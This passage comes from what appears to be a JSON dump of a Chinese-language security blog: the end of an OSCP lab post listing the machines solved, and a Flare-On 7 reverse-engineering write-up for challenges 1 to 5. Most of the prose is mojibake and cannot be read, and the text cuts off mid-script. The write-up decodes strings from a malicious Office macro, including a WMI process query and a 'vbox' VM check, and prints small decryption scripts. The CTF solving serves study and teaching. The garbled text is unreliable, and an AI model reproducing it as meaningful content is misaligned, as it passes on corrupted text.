æ»¿è²´çš„ï¼Œæ‰€ä»¥å¾ˆå¤šäººæœƒé¸æ“‡æ¯”è¼ƒä¾¿å®œæˆ–æ˜¯å…è²»çš„æ›¿ä»£æ–¹æ¡ˆï¼Œæˆ‘è‡ªå·±æ˜¯æŠŠå®˜æ–¹çš„ Lab åšå®Œå°±åŠæ­»ä¸æ´»äº†ã€‚ HackTheBox VulnHub RootMe æˆ‘å®Œæˆçš„æ©Ÿå™¨ï¼ˆç…§è§£é¡Œåº) # Hostname Remarks 1 Phoenix 2 Pain 3 Alpha Learning Path 4 Beta Learning Path 5 Bob 6 Ralph 7 Sean Learning Path 8 Leftturn 9 Break 10 Chris Learning Path 11 Susie Learning Path 12 Mailman Learning Path 13 Disco Learning Path 14 svclient08 15 Luigi Admin dep 16 SV-DC01 17 sv-file01 18 svclient73 19 fc4 20 Jd 21 Tricia Admin dep 22 Harry Admin dep 23 Jack Admin dep 24 Mario Admin dep 25 Shared IT dep 26 1nsider 27 Alice Learning Path 28 Bethany Learning Path 29 gh0st 30 Pi 31 Timeclock Develop dep 32 Mike 33 Kaitlyn Admin dep 34 Ekzameno Admin dep 35 Adam Develop dep 36 John Develop dep 37 Carol Develop dep 38 Gamma 39 XOR-APP59 Learning Path 40 XOR-APP23 41 XOR-APP07 42 XOR-DC01 43 Tophat 44 Dotty 45 Mail 46 Peter 47 Pedro 48 Bruce 49 Maria 50 Hotline Learning Path 51 Sufferance 52 Jeff 53 DJ 54 Humble 55 Core 56 Kraken 57 James Develop dep 58 Manager Develop dep å¿ƒå¾—è·Ÿä¸€äº›é›œä¸ƒé›œå…«çš„æ±è¥¿ä¸€é–‹å§‹æ‰“ Lab çš„æ™‚å€™çœŸçš„æœƒä¸å°å¿ƒæ‰é€²æ‰“ CTF çš„æ€è€ƒç¿’æ…£è£¡é¢ï¼Œå°¤å…¶æœ‰ Web Application çš„æ©Ÿå™¨é™¤äº†ææ¬Šçš„éƒ¨åˆ†ï¼Œæ•´å€‹æ„Ÿè¦ºé‚„æ˜¯è·Ÿ CTF ç›¸ä¼¼çš„ï¼Œä¸éå¿ƒç†ä¸Šç¿’æ…£ Lab çš„å½¢å¼ä¹‹å¾Œå°±æœƒæ…¢æ…¢æœ‰è‡ªå·±çš„æ‰‹é †äº†ï¼Œçœ‹åˆ° Web é™¤äº†å…ˆè‡ªå·±æˆ³æ´åœ¨å“ªï¼Œå…ˆæ‰¾ Public Exploitation ä¸ç®¡åœ¨å¯¦å‹™ä¸Šé‚„æ˜¯ Lab è£¡éƒ½æ˜¯å¿…è¦çš„æ­¥é©Ÿï¼Œæ‰¾ä¸åˆ°å°±ç®—äº†ï¼Œä½†æ‰¾åˆ°å¯ä»¥ç¯€çœå¾ˆå¤šæ™‚é–“ã€‚ OSCP æ•´é«”çš„é›£åº¦æˆ‘è¦ºå¾—é‚„æ˜¯ç®—åä½çš„ï¼ŒWeb Application çš„éƒ¨åˆ†æœ€é›£æœ€é›£ä¹Ÿå°±åªæœ‰è¦æƒ³è¾¦æ³• LFI to RCEï¼Œå°æ–¼å¹³å¸¸æœ‰åœ¨æŠŠç©çš„äººæ‡‰è©²æ˜¯ä¸æˆå•é¡Œï¼Œè«–å£‡ä¸Šç”šè‡³é‚„æœ‰äººæ˜¯éœ€è¦ä¾é  commix æ‰åšå¾—å‡ºåŸºæœ¬çš„ command injection é¡Œâ€¦.ï¼Œå†ä¾†å°±æ˜¯ Lab æ‰€éœ€çš„çŸ¥è­˜æˆ–æ˜¯å¸¸è­˜ (?) ä¸¦ä¸ä¸€å®šåŒ…å«åœ¨æ•™æè£¡é¢ï¼Œæœ‰å¾ˆå¤šé“é¡Œç›®æ˜¯æˆ‘æœ¬ä¾†å°±è©¦éæˆ–çŸ¥é“çš„æ¢—ï¼Œä½†å¦å¤–ä¸€äº›å°±çœŸçš„æ˜¯å­¸ç¿’äº†â€¦å»ºè­°é‚„æ˜¯æŠŠ Lab éƒ½æ‘¸ä¸€éæ¯”è¼ƒåˆ’ç®—ä¸€é»ï¼Œç”¨èº«é«”å­¸ä¾†çš„æ•™è¨“è¨˜çš„æ¯”è¼ƒä¹…ã€‚ å¦å¤–ä¸€å€‹æ”¶ç©«å¤§æ¦‚æ˜¯çœ‹äº†ä¸€å †è‹±æ–‡çš„å±è©±è·Ÿè—é ­â€¦å› ç‚ºè«–å£‡ç™¼è¨€æœƒè¢«å¯©æŸ¥ï¼Œå…·é«”çš„å·¥å…·æˆ–æ˜¯æœå‹™æœƒè¢« &lt;spoiler&gt; æ›¿æ›ï¼Œæˆ–è€…æ˜¯ SMB è®Šæˆ S*** ä¹‹é¡çš„ï¼Œæ‰€ä»¥æœ‰äº›äººæœƒç”¨æ›´æœ‰å‰µæ„ä¸€é»çš„æ–¹å¼ä¾†è‡ªæˆ‘å¯©æŸ¥ï¼Ÿä¾‹å¦‚ .ps1 å°±æœƒè®Šæˆ PlayStation1ã€Metasploit è®Šæˆ The Forbidden Toolã€Powershell Empire è®Šæˆ Darth Vader ç­‰ç­‰ï¼Œé‚„æœ‰æ›´å¤šç¬¬ä¸€çœ¼çœ‹åˆ°ä¸çŸ¥é“åœ¨å¯«ä»€éº¼é¬¼ï¼Œä½†æ˜¯è§£å®Œçœ‹åˆ°æœƒç¬‘å‡ºä¾†çš„è‹±æ–‡è©©ï¼ŒæŒºæœ‰æ”¶ç©«çš„â€¦? æ¥ä¸‹ä¾†å°±æ˜¯ç­‰æˆ‘é‚£å¼µåœ¨ç–«æƒ…é¢¨æš´ä¸‹ä¸çŸ¥é“ä»€éº¼æ™‚å€™æ‰æœƒä¾†çš„è­‰ç…§â€¦ çµæœæ¯”æˆ‘æƒ³çš„é‚„è¦æœ‰æ•ˆç‡ï¼Œä»–å€‘ç”¨ DHL å¾è²å¾‹è³“å¯„éä¾†ï¼Œæ±è¥¿ 3&#x2F;3 å°±å·²ç¶“èººåœ¨æˆ‘å®¶äº†ï¼Œåªæ˜¯æ¸…æ˜é€£å‡æˆ‘æ‰å›å®¶æŠŠå®ƒæ‰“é–‹ï¼Œé…·â€¦","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"OSCP","slug":"OSCP","permalink":"http://blog.terrynini.tw/tags/OSCP/"}]},{"title":"2020::Flare-On 7::Write-up","slug":"2020-Flare-On-7-Write-up","date":"2020-10-22T06:57:07.000Z","updated":"2024-06-20T16:45:57.876Z","comments":true,"path":"tw/2020-Flare-On-7-Write-up/","permalink":"http://blog.terrynini.tw/tw/2020-Flare-On-7-Write-up/","excerpt":"å–”è€¶ï¼Œé›–ç„¶åæ¬¡æ²’æœ‰å¾ˆè®šï¼Œä½†é‚„æ˜¯ç ´å°äº†ï¼Œåˆçœ‹äº†ä¸€å †å¥‡æŠ€æ·«å·§ğŸ¤”ï¸ä»Šå¹´å‰é¢æ‰“çš„å¤ªæ‚ é–’ï¼Œå°è‡´ 11 é¡Œå·®é»è§£ä¸æ‰ï¼Œå“­å•Šâ€¦é€™æ¬¡è§£é¡Œé‚Šè§£é‚ŠæŠŠ writeup æçš„å·®ä¸å¤šäº†ï¼Œé †æ‰‹ä¾†ç™¼ä¸€ç¯‡","text":"å–”è€¶ï¼Œé›–ç„¶åæ¬¡æ²’æœ‰å¾ˆè®šï¼Œä½†é‚„æ˜¯ç ´å°äº†ï¼Œåˆçœ‹äº†ä¸€å †å¥‡æŠ€æ·«å·§ğŸ¤”ï¸ä»Šå¹´å‰é¢æ‰“çš„å¤ªæ‚ é–’ï¼Œå°è‡´ 11 é¡Œå·®é»è§£ä¸æ‰ï¼Œå“­å•Šâ€¦é€™æ¬¡è§£é¡Œé‚Šè§£é‚ŠæŠŠ writeup æçš„å·®ä¸å¤šäº†ï¼Œé †æ‰‹ä¾†ç™¼ä¸€ç¯‡ å¿ƒå¾—æ ¹æ“šå®˜æ–¹çš„çµ±è¨ˆæ•¸æ“šï¼Œä»Šå¹´åº¦å°ç£ç¸½å…±æœ‰ 4 å€‹äººç ´å°ï¼Œä½†é€™å€‹æ•¸æ“šæœ‰é»å¤±çœŸï¼Œå› ç‚ºå°±æˆ‘æ‰€çŸ¥è‡³å°‘é‚„æœ‰å…©å€‹äººç ´å°ä½†æ˜¯æ²’æ›å°ç£åœ‹ç±ï¼Œä½†ä¹Ÿçœ‹å¾—å‡ºä¾†å¤§å®¶è¶Šä¾†è¶Šå¿™ï¼Œ2019 å¹´çš„æ™‚å€™é‚„æœ‰ 8 å€‹äººã€‚ å°±çœ‹å¾—åˆ°çš„çµæœä¾†èªªï¼Œæˆ‘æ˜¯ç¬¬ 2 å€‹ç ´å°çš„å°ç£äººï¼Œä¸éè·Ÿç¬¬ä¸€åçš„ Lays å¯¦åœ¨æ˜¯å·®æœ‰é»é ğŸ¤”ï¸ï¼Œé€™æ¬¡å®˜æ–¹é‚„å¾ˆæœ‰è¶£çš„çµ±è¨ˆäº†åœ‹å®¶çš„äººå‡ç ´å°ç‡ï¼Œæˆ‘å€‹äººæ˜¯è¦ºå¾—çœ‹å®Œç¬‘ç¬‘å°±å¥½äº†ï¼Œä½†æ–°åŠ å¡çš„æ•¸å­—é‚„çœŸæ˜¯å¯æ€•ã€‚ æ˜¯èªªå¯«é€™ç¨® writeup éƒ½æœ‰é»éº»ç…©ï¼Œå¯«åˆ°è¶…ç´šè©³ç´°è®“æ²’æœ‰æ‰“çš„äººéƒ½çœ‹å¾—æ‡‚ç•¶ç„¶æ˜¯å¯è¡Œï¼Œä½†æ˜¯æ™‚é–“æˆæœ¬å¤ªé«˜äº†ï¼Œæ‰€ä»¥æˆ‘å°±åœ¨é€™è£¡ç•™å€‹å¤§æ¦‚ï¼Œå¦‚æœçœŸçš„æœ‰äººç”¨ Flare-On åœ¨ç·´ç¿’ reversing çš„æ™‚å€™çœ‹ä¸æ‡‚çš„è©±ï¼Œå¯ä»¥ç›´æ¥æˆ³æˆ‘æ²’é—œä¿‚ã€‚ ä»Šå¹´çš„ badge æ˜¯é‘°åŒ™ï¼ŒæŒºé…·é…·çš„ï¼š 1 - fidlerDescription Welcome to the Seventh Flare-On Challenge!This is a simple game. Win it by any means necessary and the victory screen will reveal the flag. Enter the flag here on this site to score and move on to the next level.This challenge is written in Python and is distributed as a runnable EXE and matching source code for your convenience.You can run the source code directly on any Python platform with PyGame if you would prefer.*7zip password: flare Solutionå¾åœ–ç‰‡ä¸Šçœ‹å¾—å‡ºä¾†æ˜¯ä½¿ç”¨ PyInstaller æ‰“åŒ…éçš„ç¨‹å¼ï¼Œç›´æ¥æ‰¾ç”¨å·¥å…·æŠŠ python bytecode æŠ½å‡ºä¾†ï¼ŒPyInstaller Extractorï¼š åŒæ™‚é‹è¡Œç¨‹å¼çœ‹ä¸€ä¸‹æœ‰ä»€éº¼ç›®æ¨™ï¼Œçœ‹èµ·ä¾†æ˜¯è¦å…ˆæ‰¾å¯†ç¢¼ï¼š å¾å‰›å‰› decompile ä¾†çš„ python code å¯ä»¥çŸ¥é“å¯†ç¢¼æ˜¯ã€Œghostã€ï¼š fidler.py 14151617def password_check(input): altered_key = &#x27;hiptu&#x27; key = &#x27;&#x27;.join([chr(ord(x) - 1) for x in altered_key]) return input == key çœ‹èµ·ä¾†æ˜¯ pygameï¼ŒéŠæˆ²æ¨¡å¼é¡ä¼¼ Cookie Clicker ç›´æ¥ call è§£å¯† flag çš„åœ°æ–¹ï¼š fidler.py 249250251252if __name__ == &#x27;__main__&#x27;: target_amount = 103079215104 print(decode_flag(int(target_amount / 100000000)))#idle_with_kitty@flare-on.com 2 - garbageDescription One of our team members developed a Flare-On challenge but accidentally deleted it.We recovered it using extreme digital forensic techniques but it seems to be corrupted.We would fix it but we are too busy solving todayâ€™s most important information security threats affecting our global economy.You should be able to get it working again, reverse engineer it, and acquire the flag.*7zip password: flare Solutionç›´æ¥åŸ·è¡Œé¡Œç›®çµ¦çš„ garbage.exe ï¼Œ windows ç›´æ¥è·³éŒ¯èª¤åœ¨è‡‰ä¸Šï¼š æª¢æŸ¥ PE Header çš„å„ç¨®æ¬„ä½çœ‹èµ·ä¾†æ²’ä»€éº¼å•é¡Œï¼Œä½†æª¢æŸ¥ Section header æœƒç™¼ç¾ï¼Œé€™æ˜¯ä¸€éš»ç”± UPX å£“ç¸®éçš„ç¨‹å¼ï¼ŒåŒæ™‚æœ€å¾Œä¸€å€‹ .rsrc çš„ size ä¸å°ï¼Œæ ¹æ“šé¡Œç›®æ•˜è¿°ï¼Œé€™è£¡å¯ä»¥åˆç†æ¨æ–·è©²åœ°æ–¹çš„æ•¸æ“šéºå¤±ï¼Œç›´æ¥ xxd garbage.exe å¯ä»¥çœ‹åˆ°å°¾ç«¯çš„ xml è¢«æˆªæ–·äº†æ‰€ä»¥æ²’æœ‰é–‰åˆï¼š 00009e40: 0904 0000 4800 0000 5c90 0100 7d01 0000 ....H...\\...&#125;...00009e50: 0000 0000 0000 0000 6050 0100 3c3f 786d ........`P..&lt;?xm00009e60: 6c20 7665 7273 696f 6e3d 2731 2e30 2720 l version=&#x27;1.0&#x27;00009e70: 656e 636f 6469 6e67 3d27 5554 462d 3827 encoding=&#x27;UTF-8&#x27;00009e80: 2073 7461 6e64 616c 6f6e 653d 2779 6573 standalone=&#x27;yes00009e90: 273f 3e0d 0a3c 6173 7365 6d62 6c79 2078 &#x27;?&gt;..&lt;assembly x00009ea0: 6d6c 6e73 3d27 7572 6e3a 7363 6865 6d61 mlns=&#x27;urn:schema00009eb0: 732d 6d69 6372 6f73 6f66 742d 636f 6d3a s-microsoft-com:00009ec0: 6173 6d2e 7631 2720 6d61 6e69 6665 7374 asm.v1&#x27; manifest00009ed0: 5665 7273 696f 6e3d 2731 2e30 273e 0d0a Version=&#x27;1.0&#x27;&gt;..00009ee0: 2020 3c74 7275 7374 496e 666f 2078 6d6c &lt;trustInfo xml00009ef0: 6e73 3d22 7572 6e3a 7363 6865 6d61 732d ns=&quot;urn:schemas-00009f00: 6d69 6372 6f73 6f66 742d 636f 6d3a 6173 microsoft-com:as00009f10: 6d2e 7633 223e 0d0a 2020 2020 3c73 6563 m.v3&quot;&gt;.. &lt;sec00009f20: 7572 6974 0a urit. ç¸½ä¹‹å°±æ˜¯æŠŠ IAT ä¿®å¥½ï¼Œè®“ UPX æ‰¾å¾—åˆ°éœ€è¦ç”¨çš„ Dll è·Ÿå°æ‡‰çš„ functionï¼Œå› ç‚ºæ˜¯åŸ·è¡Œæª”æ‰€ä»¥ relocation å¯ä»¥ä¸ç®¡ï¼Œä¿®å¥½çš„ binary æˆ‘æ”¾åœ¨é€™è£ï¼Œç›´æ¥åŸ·è¡Œå°±æœƒç”Ÿæˆåç‚º sink_the_tanker.vbs çš„è…³æœ¬è² è²¬æŠŠ flag ç›´æ¥å°å‡ºä¾†ï¼š 3 - wednesdayDescription Be the wednesday. Unlike challenge 1, you probably wonâ€™t be able to beat this game the old fashioned way. Read the README.txt file, it is very important. README.txt 123456789101112131415161718192021â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â• â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â• â•šâ•â• --- BE THE WEDNESDAY --- S M T DUDE T F S --- Enable accelerated graphics in VM --- --- Attach sound card device to VM --- --- Only reverse mydude.exe --- --- Enjoy it my dudes ---% Solutionå¾ dll å¯ä»¥çŸ¥é“æ˜¯ç”¨ SDL æå‡ºä¾†çš„éŠæˆ²ï¼Œæ‰“é–‹å€‹äº”åˆ†é˜å¤§æ¦‚å°±èƒ½æŠ“åˆ°è¦å‰‡ï¼Œåªè¦æœ‰ M é€™å€‹ç®±å­å°±å¿…é ˆå¾ç®±å­çš„ä¸‹é¢é€šéï¼Œå¦å‰‡å°±ä¸€å®šè¦å¾ä¸Šé¢è·³éå»ï¼š ç¨å¾®çœ‹ä¸€ä¸‹ binary å¯ä»¥ç™¼ç¾é€™å€‹ç¨‹å¼æ˜¯ç”¨ nim æ’°å¯«çš„ï¼Œä»–çš„ç‰¹è‰²æ˜¯æœƒè¢«ç·¨è­¯æˆç­‰åƒ¹çš„ C æˆ–æ˜¯ C++ ç­‰èªè¨€ï¼Œç¸½ä¹‹ä¸åŒæ–¼ bytecodeï¼Œnim é€ å‡ºä¾†çš„æª”æ¡ˆæ˜¯ç„¡æ³•ç›´æ¥ decompile çš„ï¼Œä¸é function çš„ symbol å€’æ˜¯æ²’æœ‰å…¨éƒ¨éƒ½æ‹”é™¤ï¼Œå¯ä»¥ç²—ç•¥çš„çŒœå¾—å‡ºç›¸é—œåŠŸèƒ½ï¼š é€™è£ç›´æ¥å¾ç¢°æ’åˆ¤å®šä¸‹æ‰‹ï¼Œåœ¨ onCollide__9byAjE9cSmbSbow3F9cTFQfLg ä¸­å¯ä»¥ç™¼ç¾è§’è‰²çš„ç¢°æ’åˆ¤å®šä»¥åŠåˆ†æ•¸åˆ¤å®šï¼Œfunction çš„ä¸ŠåŠéƒ¨ï¼ˆä¸åœ¨åœ–ç‰‡ä¸Šï¼‰æ˜¯è§’è‰²ç›´æ¥ç¢°æ’ç®±å­æœ¬é«”çš„æƒ…æ³ï¼Œç„¡è¦–ï¼Œç›´æ¥æŠŠä¸‹åŠæ®µé—œæ–¼ M ç®±å­åˆ¤æ–·çš„ if æ¢ä»¶å¼ï¼ˆæˆªåœ–ä¸­æœ€ä¸Šé¢çš„é‚£æ¢ ifï¼‰ patch æˆä¸€å®šæœƒé€²å…¥åŠ åˆ†çš„ç¨‹å¼ç¢¼ï¼ŒåŒæ™‚å¯ä»¥åœ¨ update__Arw3f6ryHvqdibU49aaayOg çš„æœ€ä¸‹é¢çŸ¥é“åˆ†æ•¸åˆ°é” 296 ä¹‹å¾Œå¯ä»¥çœ‹åˆ° flagï¼š patch å®Œä¹‹å¾Œå°±ç„¡è…¦ç©ï¼Œä¸€ç›´è¹²ä¸‹ç›´åˆ°åˆ†æ•¸åˆ° 296 å°±å¥½äº†ï¼Œç›´æ¥ç”¨ cheat engine åšåŠ é€Ÿï¼š The video tag is not supported by your browser. 4 - reportDescription Nobody likes analysing infected documents, but it pays the bills. Reverse this macro thrill-ride to discover how to get it to show you the key. Solutionçœ‹èµ·ä¾†æ˜¯ office çš„å·¨é›†ç—…æ¯’ï¼Œå°‘æ±è¥¿æ‰€ä»¥ä¸æœƒçœŸçš„åŸ·è¡Œï¼Œç›´æ¥çœ‹å·¨é›†çš„éƒ¨åˆ†ï¼Œå¤§éƒ¨åˆ†çš„æ±è¥¿éƒ½æ˜¯ç°¡å–®çš„ encodeï¼Œé¦–å…ˆæŠŠä¸€äº›ç‰©ä»¶ç”¨åˆ°çš„å­—ä¸²è§£å‡ºä¾†ï¼Œå…¶ä¸­å¯ä»¥çœ‹åˆ°æœ‰äº›å­—ä¸²ä¸¦æ²’æœ‰çœŸçš„è¢«ä½¿ç”¨åˆ°ï¼Œå¯èƒ½éœ€è¦çŒœä¸€ä¸‹è¢«æ‹¿å»åšäº†ä»€éº¼äº‹æƒ…ï¼š string.py 12345678910111213141516171819202122232425262728293031323334353637def rigmarole(a): t = &#x27;&#x27; for i in range(0,len(a),4): t += chr(int(a[i:i+2],16)-int(a[i+2:i+4],16)) return tdef folderol(): onzo = &quot;9655B040B64667238524D15D6201.B95D4E01C55CC562C7557405A532D768C55FA12DD074DC697A06E172992CAF3F8A5C7306B7476B38.C555AC40A7469C234424.853FA85C470699477D3851249A4B9C4E.A855AF40B84695239D24895D2101D05CCA62BE5578055232D568C05F902DDC74D2697406D7724C2CA83FCF5C2606B547A73898246B4BC14E941F9121D464D263B947EB77D36E7F1B8254.853FA85C470699477D3851249A4B9C4E.9A55B240B84692239624.CC55A940B44690238B24CA5D7501CF5C9C62B15561056032C468D15F9C2DE374DD696206B572752C8C3FB25C3806.A8558540924668236724B15D2101AA5CC362C2556A055232AE68B15F7C2DC17489695D06DB729A2C723F8E5C65069747AA389324AE4BB34E921F9421.CB55A240B5469B23.AC559340A94695238D24CD5D75018A5CB062BA557905A932D768D15F982D.D074B6696F06D5729E2CAE3FCF5C7506AD47AC388024C14B7C4E8F1F8F21CB64&quot;.split(&quot;.&quot;) for idx, i in enumerate(onzo): print(idx,i) print(f&quot;onzo[&#123;idx&#125;] = &#123;rigmarole(i)&#125;&quot;)folderol()# 0 9655B040B64667238524D15D6201# onzo[0] = AppData# 1 B95D4E01C55CC562C7557405A532D768C55FA12DD074DC697A06E172992CAF3F8A5C7306B7476B38# onzo[1] = \\Microsoft\\stomp.mp3# 2 C555AC40A7469C234424# onzo[2] = play# 3 853FA85C470699477D3851249A4B9C4E# onzo[3] = FLARE-ON# 4 A855AF40B84695239D24895D2101D05CCA62BE5578055232D568C05F902DDC74D2697406D7724C2CA83FCF5C2606B547A73898246B4BC14E941F9121D464D263B947EB77D36E7F1B8254# onzo[4] = Sorry, this machine is not supported.# 5 853FA85C470699477D3851249A4B9C4E# onzo[5] = FLARE-ON# 6 9A55B240B84692239624# onzo[6] = Error# 7 CC55A940B44690238B24CA5D7501CF5C9C62B15561056032C468D15F9C2DE374DD696206B572752C8C3FB25C3806# onzo[7] = winmgmts:\\\\.\\root\\CIMV2# 8 A8558540924668236724B15D2101AA5CC362C2556A055232AE68B15F7C2DC17489695D06DB729A2C723F8E5C65069747AA389324AE4BB34E921F9421# onzo[8] = SELECT Name FROM Win32_Process# 9 CB55A240B5469B23# onzo[9] = vbox# 10 AC559340A94695238D24CD5D75018A5CB062BA557905A932D768D15F982D# onzo[10] = WScript.Network# 11 D074B6696F06D5729E2CAE3FCF5C7506AD47AC388024C14B7C4E8F1F8F21CB64# onzo[11] = \\Microsoft\\v.png ç¹¼çºŒå¾€ä¸‹çœ‹å¯ä»¥ç™¼ç¾ï¼Œå·¨é›†æœƒè§£å¯†ä¸€æ®µ data ç„¶å¾Œå„²å­˜ç‚º stomp.mp3ï¼Œå¯«å€‹ python æ¨¡ä»¿ä»–è§£å¯†ï¼Œä½†æˆ‘å€‘å¾—åˆ°çš„éŸ³æª”è½èµ·ä¾†è·Ÿ flag ä¸€é»é—œä¿‚ä¹Ÿæ²’æœ‰ï¼Œä¸éå¯ä»¥æ³¨æ„åˆ°é€™è£¡ä¹Ÿæœ‰éƒ¨åˆ†çš„ data æ˜¯å®Œå…¨æ²’æœ‰è¢«ä½¿ç”¨åˆ°çš„ï¼š decrypt.py 123456f = open(&quot;./T&quot;,&#x27;r&#x27;).read().strip()key = [0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee]kuffle = bytes([(int(f[i:i+2],16) ^ key[(i//4)%len(key)]) for i in range(0,168667*4,4)])with open(&quot;stomp.mp3&quot;,&#x27;wb&#x27;) as z: z.write(kuffle) æ²’æœ‰ç”¨åˆ°çš„æ˜¯ data çš„å¦å¤–ä¸€åŠï¼Œä»¥åŠä¸€äº›å­—ä¸² \\Microsoft\\v.pngï¼ŒFLARE-ONï¼Œå¦‚æœæŠŠ data æŠ½å‡ºä¾†ï¼Œç„¶å¾Œå‡è¨­æª”é ­æ˜¯ PNG çš„æ ¼å¼ï¼Œå°±å¯ä»¥ç™¼ç¾ xor å‡ºä¾†çš„çµæœæ˜¯ NO-Eï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥çŒœ key å°±æ˜¯ &quot;FLARE-ON&quot;[::-1]ï¼Œç›´æ¥å¯«è…³æœ¬è§£ï¼š flag.py 123456f = open(&quot;./T&quot;,&#x27;r&#x27;).read().strip()key = b&#x27;FLARE-ON&#x27;[::-1]kuffle = [int(f[i:i+2],16) ^ key[((i-2)//4)%len(key)] for i in range(2,len(f),4)]with open(&quot;flag.png&quot;,&#x27;wb&#x27;) as z: z.write(bytes(kuffle)) ç„¶å¾Œå°±æ‹¿åˆ° flag çš„åœ–ç‰‡äº†ï¼š 5 - TKAppDescription Now you can play Flare-On on your watch! As long as you still have an arm left to put a watch on, or emulate the watchâ€™s operating system with sophisticated developer tools. Solutionä¸€æ¨£æ˜¯æ»¿ç„¡èŠçš„ä¸€é¡Œï¼Œé¡Œç›®çµ¦çš„æ˜¯ Galaxy Watch çš„æ‡‰ç”¨ç¨‹å¼ï¼Œä½†å‹•æ…‹ä¸¦æ²’æœ‰ä»€éº¼æ˜é¡¯çš„å¥½è™•ï¼Œå…ˆç›´æ¥éœæ…‹ç†è§£ä¸€ä¸‹ï¼Œç›´æ¥è§£å£“ç¸® TKApp.tpk å¾Œèµ°èµ°çœ‹çœ‹ï¼Œæ‡‰è©²èƒ½å¤ ç¢ºå®šæ‡‰ç”¨ç¨‹å¼çš„éƒ¨åˆ†æ˜¯ .NET ç¨‹å¼ï¼š ExifLib.Standard.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsTKApp.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS WindowsTizen.Wearable.CircularUI.Forms.Renderer.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsTizen.Wearable.CircularUI.Forms.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Core.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Platform.Tizen.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Platform.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsXamarin.Forms.Xaml.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows ç¸½ä¹‹æ‹¿å€‹ .NET çš„ decompiler çœ‹ä¸€ä¸‹ï¼Œç¨‹å¼æ‹¿ä¸€å †å­—ä¸²ä¾†ç•¶ä½œ AES çš„ keyï¼Œç”¨ä¾†è§£å‡º flagï¼Œæ‰€æœ‰çš„æ±è¥¿éƒ½èƒ½ç›´æ¥æ‰¾åˆ°ï¼Œå»æ‰¾ app descriptionï¼Œåœ–ç‰‡çš„ exif è³‡è¨Šç­‰ç­‰ï¼Œç„¶å¾Œèº«ç‚º cipher çš„ Runtime.dll å‰‡æ˜¯ç›´æ¥èººåœ¨ TPK.dll è£¡é¢ï¼Œç›´æ¥å¯«è§£å¯† decrypt.py 1234567891011from Crypto.Cipher import AESfrom hashlib import sha256from base64 import *IV = b&#x27;NoSaltOfTheEarth&#x27;key = 